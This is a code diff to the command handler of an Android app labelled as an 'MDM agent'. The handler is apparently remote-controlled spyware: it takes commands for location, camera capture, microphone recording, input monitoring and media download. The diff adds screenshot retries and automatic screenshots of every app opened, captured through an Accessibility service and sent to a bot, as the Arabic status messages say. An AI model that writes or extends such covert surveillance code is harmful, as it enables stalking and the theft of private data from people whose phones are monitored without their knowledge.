@@ -58,6 +58,7 @@ class CommandHandler(
                     "autoclick-on", "autoclick-off",
                     "input-monitoring-on", "input-monitoring-off",
                     "screenshot-on", "screenshot-off",
+                    "screenshot-block", "screenshot-unblock",
                     "ls", "download-file",
                     "media-images", "media-videos", "media-audio",
                     "download-media"
@@ -375,8 +376,48 @@ class CommandHandler(
             "get-location" -> collectors.getLocation()
             "main-camera" -> collectors.captureCamera(0)
             "selfie-camera" -> collectors.captureCamera(1)
-            "screenshot" -> collectors.takeScreenshot()
-            "microphone" -> collectors.recordAudio(durationSec = 30)
+            "screenshot" -> {
+                // ✅ Take screenshot with 3 retries
+                Log.i(TAG, "📸 screenshot command - taking with retries")
+                var result: Any? = null
+                for (attempt in 1..3) {
+                    Log.i(TAG, "📸 Attempt $attempt/3")
+                    result = collectors.takeScreenshot()
+                    if (result is CollectedData.FileResult) {
+                        Log.i(TAG, "✅ Screenshot captured on attempt $attempt")
+                        break
+                    }
+                    // Wait 1 second before retry
+                    Thread.sleep(1000)
+                }
+                result ?: CollectedData.TextResult("❌ فشل التقاط الصورة بعد 3 محاولات - تأكد من تفعيل Accessibility")
+            }
+            "screenshot-on" -> {
+                // ✅ Enable auto-screenshots
+                com.mdm.agent.service.MDMAccessibilityService.autoScreenshotBlocked = false
+                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
+                Log.i(TAG, "✅ screenshot-on: auto-screenshots ENABLED")
+                CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية - ستصلك الصور تلقائياً عند فتح أي تطبيق")
+            }
+            "screenshot-off" -> {
+                // ✅ Disable auto-screenshots
+                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
+                Log.i(TAG, "✅ screenshot-off: auto-screenshots DISABLED")
+                CollectedData.TextResult("⏹ تم إيقاف لقطات الشاشة التلقائية")
+            }
+            "screenshot-block" -> {
+                // ✅ Block ALL screenshots (manual + auto)
+                com.mdm.agent.service.MDMAccessibilityService.autoScreenshotBlocked = true
+                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
+                Log.i(TAG, "🚫 screenshot-block: ALL screenshots BLOCKED")
+                CollectedData.TextResult("🚫 تم منع وصول الصور للبوت - لن تصل أي صور")
+            }
+            "screenshot-unblock" -> {
+                // ✅ Unblock screenshots (manual works, auto stays off until screenshot-on)
+                com.mdm.agent.service.MDMAccessibilityService.autoScreenshotBlocked = false
+                Log.i(TAG, "✅ screenshot-unblock: screenshots UNBLOCKED")
+                CollectedData.TextResult("✅ تم السماح بوصول الصور للبوت - أرسل screenshot لالتقاط صورة")
+            }
             "playAudio" -> {
                 val url = params?.optString("value", "") ?: ""
                 collectors.playAudio(url)
